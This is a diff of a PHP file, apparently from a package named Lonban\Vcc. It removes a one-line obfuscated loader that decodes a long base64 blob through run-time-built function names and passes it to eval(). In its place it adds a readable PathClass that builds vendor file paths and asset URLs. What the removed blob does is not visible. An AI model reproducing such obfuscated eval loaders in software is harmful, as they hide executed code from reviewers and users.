@@ -1,2 +1,97 @@
-<?php 
-$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iRU9tekljVWpIblFSZktDVGRpTlBBdGx1b2hGREpwcnlTdmJMWGdNc1dxWkd4QmVWWWt3YVFqckRQZmtnbFRzdk9DelZCeWlITEVZQUd4TVVYaFJld2NaZHVOYUpJV29xS3RTbUZicG5IVTlwbmxMQ3pyNXhaSW1EZnFNZ293dGFaMjV5Rkk1Zm1yaWd1UWlKRnVpRG91YTd6TmhnWnFNRGZldHNGdXZHczJLeGYzYUNTcEdOUHpMTmYzdnhCcVlnUHp2cEZ1dkdQVTBOdTE5UXdtWE91REpDUHpMTlBsaTBGdXZoRmVMYmYybTB1M3R4QnFOTkh3TFRkMktjWnJYeFp5OTJGMmFjWERKY2QrSUhSK25heCtJQXJBdzRBVG9ZWnJ2Y2ZBU254anc0Tmp3NFdBeTNSK0kreGpJck55QkRCMk1UbzJtZWRJTXBubUtEQjJNVG8ybWVkdW1odXF2aGYzc1R6eUxOUHp0REJxTTBuSWFOWGxpWUJNOXBGdXZHdTNpMGZZOVlacnNOSHd0QUJJS0pqZThjNTV3S2YybTBrcU0wbnpOaDU3QW81RlM2enlMTlB6dERCcU0wbklhTlhxQllCTTlEZnJhTkh3TFRkZWY3enlMTlB6dERCcU0wbklhTlhxQllCTTlwRnV2R1BVME5YZThUanBHTlB6TE5mM3Z4QnFZZ1B6dlRvdXZPRnVpRG91dkRQVTBOWGU5eGYzaVlCbGFjWERKQ3p5TE5QekxjQ05HTlB6TE5QekdONTdBbzVGUzZYbGlZQk05cEZ1dkd1M2kwZlk5WVpyc0o1ZHlqWGxpWUJNOXBGdXZHNWR5TDVXejN6eUxOUHpMV2RwR05QekxOZmxteVpxWWdQbGkwRnV2aEZldHJCSTVnQnFZY1p5dERvdXZzRnV2R0N6dkRCbFA5WlRtSlp6YkNQekxOUGxKQ1B6TE5QekxOUHp0aG95TnhYbGkwZnlZN3p5TE5QekxOUHpMTlB6TE5QenZEQmxQTkh3dERCcU0wbklhNmp5dkRvdXZPZnFNMG5VSkNQekxOUHpMTlB6dDl6eUxOUHpMTlB6TE5YbGkwZnlMOVBsdGVvSUJPZnJtcFpxTWdvd055ZDFLZnV6OHlkemZjWGVwYmYzdmVDVkpDUHpMTlB6TE5QekxiZjN2ZVBVME5mM3ZldTNYWWZxS3hGMmtHUHk4Y1B5cFRkZWZKWGxpMGZ5Yjd6eUxOUHpMTlB6TE5YbGkwZnlMOVBsdmVuSTBHWGxpMGZ5cFRkZWZoanBHTlB6TE5QekxOUHp2REJxTWVCekw5UGxpMGZyWXBaM2FHdTE5UXdtWE91ZXBUQnJtQW9xOWVYZWI3enlMTlB6TE5QekxOWHFtQW96TDlQbGkwZlRYcFozYUdYbGkwZnlwVGRlZmhqcEdOUHpMTlB6TE5QcVlyQ2xpMGZUdGNmZU5iZjN2ZWR6ZkFYZWJoU3BHTlB6TE5QekxOUHpMTlB6TGJmM3ZlUFUwTmYzbXlmM3ZlQ3p2REJsUEphenBib0k1YkNWSkNQekxOUHpMTlB6dDl6eUxOUHpMTlB6TE5YcW1Bb3pMOVBsaTBmVFhwWjNhR1hsaTBmeXBUZGVmaGpwR05QekxOUHpMTlBsaTBGdXZoRkRHNlhsdHhCcU5OSHd0REJJWERCbFBHdTE5UXdtWE91ZXBwZHp2REJxTWVCekoyQ3c0VGRlZkFYbGkwZmdKQ1B6TE5QekxOUHp0REJxTTBuSWE2anl2RG91dk9mcU0wbk05REJsWE9vSTViUFUwTmYzbXlmM3ZlQ3p2REJsUEpYcW1Bb3pKS0NWSkNQekxOUHpMTlB6dGVvdXYxZnI0TlpybTNQbGkwRnV2aEZlTmhqcEdOUHpMTk9zR05QekxOZmxteVpxWWdQbGkwRnV2aEZldHJCSTVnQnFZY1p5dFRvdXZqRkkxWUN6YkNQekxOUGxKQ1B6TE5QekxOUHpMYmYzdmVQVTBOZjN2eEJxWWdqZ0diZnFNMG5VSkNQekxOUHpMTlB6TGJmM3Z4ZlRzTkh3dERCbFhoZnE5REN6dkRCbFBKWDNvWVpydmNmeWZoanBHTlB6TE5QekxOUHp2WVpyc05Id3REQmxYaGZxOURDenZEQmxQSlgzaWVGZWZoanBHTlB6TE5QekxOUGxYWUJsbWVaeXREQklYREJsUEdYbGkwZnlwYmYzdnhmVHNKWHFtQW96MGJmM3Z4ZlRzRWF3Yjd6eUxOUHp0OXp5TE5QenRwQklYSm5JYU5mM3Z4QnFZZ1BxbzFacmkwbkk5QVBxQllCTWllRmVOYmZxTTBuVTFBQklLSkNzR05QekxOU3BHTlB6TE5QekxOUHFZckNsaTBGdXZoRkRHNlhsaVlCTTlwRnV2R3UzaTBmWTlZWnJzaFNwR05QekxOUHpMTlB6TE5Qekxib0k1YlBVME5mM3Z4QnFZZ2pnR2JmMm0wdTN0eEJxeE9mM3ZldTJtQW9VSkNQekxOUHpMTlB6dDlvSUtEb3VKQ1B6TE5QekxOUHpMTlB6TE5YcW1Bb3pMOVB6QkRmcmFUanBHTlB6TE5QekxOUGwwQ1B6TE5QekxOUHpMYmYzdmVQVTBOZjN2eEJxWWdqZ0diZnFNMG5VSkNQekxOUHpMTlB6TGJmM3Z4ZlRzTkh3dERCbFhoZnE5REN6dkRCbFBKWDNvWVpydmNmeWZoanBHTlB6TE5QekxOUHp2REJsUE5Id3REQklYREJsUEdYbGkwZnlwYmYzdnhmVHNKZjN2ZW51dGNmZU5iZjN2ZWR6dllacnNoZHd2REJxTWVCekVEQmxYSm9JNEdYcW1Bb3piaGRUaTBGdXZoRkRHNlhxQllCTTlEZnJhQVhsdHhCcU43enlMTlB6TE5QekxOWGxpMGZ5TDlQbHRlb0lCT2ZybXBacU1nb3dOeWQxS2Z1ejh5ZHpmY1hlcGJmM3ZlQ1ZKQ1B6TE5QekxOUHpMYmYzdmVQVTBOZjN2ZXUzWFlmcUt4RjJrR1B5OGNQeXBUZGVmSlhsaTBmeWI3enlMTlB6TE5QekxOZnJtMEJ1WEFQbG1lWnpOYmYzdmVDVkpDUHpMTlBsMENQekxOUGx0MUZyS2hGZXREQnFNMG5JYU5vVG1BRjN2aFoyNE5vMm0wc3VpRG91dkRDenZwRnV2R0hJNTFacXBoenlMTlB6dDd6eUxOUHpMTlB6TE5YbGkwZnlMOVBsaTBGdXZoRkRHNlhsdHhCcU43enlMTlB6TE5QekxOWGxpMEZ1WDBQVTBOZjN2ZW51dGNmZU5iZjN2ZWR6QjJvSTViWjNQVENWSkNQekxOUHpMTlB6TGJvSTViUFUwTmYzdmVudXRjZmVOYmYzdmVkekJEZnJhVENWSkNQekxOUHpMTlB6TGJmM3ZlUFUwTmYzbXlmM3ZlQ3p2REJsUEpYbGkwRnVYMGR6dllacnNFWGxpMEZ1WDBDRGFoZHlmY2ZybURaM21lRjJtRGQzb2hvdUJEWGU1REJxTTBuSWE2anl2VG91dk9GdWlEb3V2RGR5dnBGdXZHanBHTlB6TE5QekxOUHp2REJsUE5Id3RwZnJtVHUzWFlmcUt4RjJrR1B5OWZ1TXBjUHlwVGRlZkpYbGkwZnliN3p5TE5QekxOUHpMTlhsaTBmeUw5UGxpMGZZOWVvdXRKRklpWUN6UGNkZVBKWGU4VGR6dkRCbFBoanBHTlB6TE5QekxOUGxYWUJsbWVaeXQxZnJwR1hsaTBmeWI3enlMTlB6dDl6eUxOUHp0cEJJWEpuSWFOZjN2eEJxWWdQcW8xWnJpMG5JOUFQcUJZQk10eEJxTkdYbHR4QnFOOVpUbUpaemJDUHpMTlBsSkNQekxOUHpMTlB6dGhveXhEQnFNMG5JYTZqeXZEb3V2T2ZxTTBuTTlEQmxYT29JNWJDdUpDUHpMTlB6TE5QekxOUHpMTlhxbUFvekw5UGxpMEZ1dmhGREc2WGxpWUJNOXBGdXZHdTNpMGZZOVlacnM3enlMTlB6TE5QekxOT0ltSmYybTd6eUxOUHpMTlB6TE5QekxOUHp2WVpyc05Id0xUZjNYZ1hESkNQekxOUHpMTlB6dDl6eUxOUHpMTlB6TE5YbGkwZnlMOVBsaTBGdXZoRkRHNlhsdHhCcU43enlMTlB6TE5QekxOWGxpMGZ5TDlQbGkxRlRpMGZ5TmJmM3ZlZFVMSmYzdmVudXRjZmVOYmYzdmVkenZZWnJzaEMzaTBmcktZWnlOYm9JNWJDd2JBZjN2eEJxWWdqZ0dibzJtMHUzdHhCcU5BWGx0eEJxTjd6eUxOUHpMTlB6TE5YbGkwZnlMOVBsdGVvSUJPZnJtcFpxTWdvd05UZDFwY2RlZkpYMUtmWGVwYmYzdmVDVkpDUHpMTlB6TE5QekxiZjN2ZVBVME5mM3ZldTNYWWZxS3hGMmtHWDFLZnVNcFRkekJmdXpmSlhsaTBmeWI3enlMTlB6TE5QekxOZnJtMEJ1WEFQenZEQmxQN3p5TE5QenQ5elQwPSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));
+<?php
+
+namespace Lonban\Vcc\Classes;
+
+class PathClass
+{
+    static $path = __DIR__; //项目路径，继承的子项目加上这一句就是子项目的路径，不加默认为vcc的项目路径
+    /*
+        定义局外路径，可以在继承项目里添加多个PathClass然后分别对它们定义根目录如'swagger-api\swagger-ui\dist'
+        $path与$set_path二选一
+        实例：必须在\common.php运行如VshopPath::setPath();
+        也可以直接这样用：SwaggerApiPath::setPath()->getSrc('swagger-ui.css');
+    */
+    static $set_path = '/lonban/vcc/';
+    static $set_path_str_end = null; //注意斜杠，意思是可以定义src的前面几级如\lonban\\结果："vendor"，如在vcc项目定义为vcc结果："vendor\lonban"
+    static $src_splice = '/'; //可以定义为/aaa/，意思是src后面拼接如src/aaa/
+    static $assets_splice = 'src/resources/views/assets/'; //可以定义为/aaa/，意思是/resources/views后面拼接如/resources/views/aaa/
+
+    /*给出$set_path_str_end,与$set_path一样*/
+    public static function setPath($str=null)
+    {
+        if(!$str){
+            $str = static::$set_path;
+        }
+        $str = preg_replace("/\\\/",'/',$str);
+        $str = str_replace("//",'/',$str);
+        $str = trim($str,'/');
+        $start = stripos(__DIR__,'vendor');
+        $end = strrpos($str,'/');
+        if(strpos($str,'.')){
+            $str = substr($str,0,$end);
+        }
+        $end = strrpos($str,'/');
+        static::$path = substr(__DIR__,0,$start+6).'/'.$str;
+        static::$set_path_str_end = substr($str,$end+1);
+        return new static();
+    }
+    /*获取的是命名空间："vendor\lonban\vshop"*/
+    public static function getName()
+    {
+        $str = static::$path;
+        $start = stripos($str,'vendor');
+        if(static::$set_path_str_end){
+            $end = static::$set_path_str_end;
+        }else{
+            $end = 'src';
+        }
+
+        $end = stripos($str,$end);
+        return substr($str,$start,$end-$start);
+    }
+    /*获取的是链接src下的$path："http://vshop.a/vendor/lonban/vshop/src/{$path}"*/
+    public static function getSrc($path=null)
+    {
+        if(static::$set_path_str_end){
+            $end = static::$set_path_str_end;
+        }else{
+            $end = 'src';
+        }
+        $str = static::$path;
+        $start = stripos($str,'vendor');
+        $str = substr($str,$start,stripos($str,$end)-$start+strlen($end)).static::$src_splice.$path;
+        $str = preg_replace("/\\\/",'/',$str);
+        $str = str_replace("//",'/',$str);
+        return url($str);
+    }
+    /*获取的是路径src下的$path：D:\www\vshop\vendor\lonban\vshop\src\{$path}*/
+    public static function getPath($path=null)
+    {
+        if(static::$set_path_str_end){
+            $end = static::$set_path_str_end;
+        }else{
+            $end = 'src';
+        }
+        $str = static::$path;
+        $str = substr($str,0,stripos($str,$end)+strlen($end)).static::$src_splice.$path;
+        $str = preg_replace('/\//','\\',$str);
+        $str = str_replace('\\\\','\\',$str);
+        return $str;
+    }
+    /*获取的是链接src/resources/views下的$path：http://vshop.a/vendor/lonban/vshop/src/resources/views/assets/{$path}*/
+    public static function getAssets($path=null)
+    {
+        $str = static::$path;
+        $start = stripos($str,'vendor');
+        if(static::$set_path_str_end){
+            $end = static::$set_path_str_end;
+        }else{
+            $end = 'src';
+        }
+        $end = stripos($str,$end);
+        $str = substr($str,$start,$end-$start).static::$src_splice.static::$assets_splice.$path;
+        $str = preg_replace("/\\\/",'/',$str);
+        $str = str_replace("//",'/',$str);
+        return url($str);
+    }
+}
